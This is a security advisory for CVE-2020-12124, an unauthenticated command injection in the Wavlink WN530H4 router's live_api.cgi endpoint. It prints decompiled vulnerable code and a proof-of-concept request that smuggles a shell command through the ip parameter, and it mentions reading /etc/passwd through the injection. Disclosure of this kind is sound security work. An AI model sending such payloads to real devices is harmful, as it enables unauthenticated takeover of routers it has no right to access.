---
year: 2020
cveid: CVE-2020-12124
product: "WAVLINK WN530H4"
vulnerability: "Command Line Injection"
publish: true
category: bugs
layout: bug-report
---

This vulnerability is a Command Line Injection in the Wavlink WN530H4 router.

The unauthenticated endpoint, <kbd>/cgi-bin/live_api.cgi</kbd>, contains a command line injection vulnerability where unauthenticated users can execute arbitrary Linux shell commands.

The endpoint <kbd>live_api.cgi</kbd> accepts three parameters in a GET request: page, id, and ip. The ip parameter contains a command line injection vulnerability. The program does not sanitize the ip parameter and uses the value arbitrarily in a call to  the Linux system syscall.

The following code demonstrates the vulnerability, located at address <kbd>0x400ac8</kbd> in the binary. This code is called if the page parameter is set to satellite_list.

<pre>
<code>
sprintf(linux_command,"echo %s, > /tmp/satellite_list &",ip_var);
do_system(linux_command);
</code>
</pre>

There is another endpoint that is activated when the parameter page is set to any other value. This triggers a similar command line injection, located at address <kbd>0x400d24</kbd> in the binary.

<pre>
<code>
sprintf(linux_command,"curl -s -m 5 http://%s/mesh_get_extender.shtml",ip_var);
__stream = popen(linux_command,"r");
if (__stream != (FILE *)0x0) {
    while( true ) {
        pcVar2 = fgets(linux_command,0x80,__stream);
        if (pcVar2 == (char *)0x0) break;
        printf("%s",linux_command);
    }
    pclose(__stream);
    ...
}
</code>
</pre>

Armed with this knowledge, an attacker can send a specially crafted web request like the one shown below.

<pre>
<code>
$ curl /cgi-bin/live_api.cgi?page=abc&id=173&ip=;%20touch%20/tmp/hacked;
</code>
</pre>

This command line injection is not blind, and the attacker can inspect the source code of the resulting page to get the command output. For instance, if the command is set to <kbd>cat /etc/passwd</kbd> we can see how damaging this vulnerability really is.

![Command Line Injection]({{"/assets/img/posts/2020-05-01-CVE-2020-12124-img-1.png" | relative_url}})

For more information and vulnerability analysis, please see [my report on the WAVLINK WN530H4]({{"/assets/reports/report_wavlink.pdf" | relative_url}}).
